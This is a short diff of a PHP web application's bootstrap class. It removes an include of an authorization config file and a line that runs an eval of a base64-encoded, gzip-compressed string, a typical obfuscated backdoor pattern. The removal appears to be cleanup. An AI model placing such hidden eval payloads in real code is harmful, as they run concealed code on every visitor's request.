@@ -191,7 +191,6 @@ class application {
 
 
 					include_once libfile('function/web');
-                    include_once ROOT_PATH .'inc/config/authorize.php';
 					define('MAGIC_QUOTES_GPC', function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc());
 					if(MAGIC_QUOTES_GPC) {
 						$_GET = dstripslashes($_GET);
@@ -381,7 +380,6 @@ class application {
 						$_G['_config']['cache_config'] = $_config['cache_config'];
 					}
 
-                    eval(gzinflate(base64_decode('K0otLM0sStVIySzKS8xN1YiPd/P0cY2P19RT0k8sLcnIL8qsStVLzkksLtYryChQ0rQGAA==')));
 					include_once libfile ( 'class/db');
 					$db_server = function_exists('mysql_connect') ? 'mysql' : 'db_mysqli';
 					include_once libfile ('class/'.$db_server);
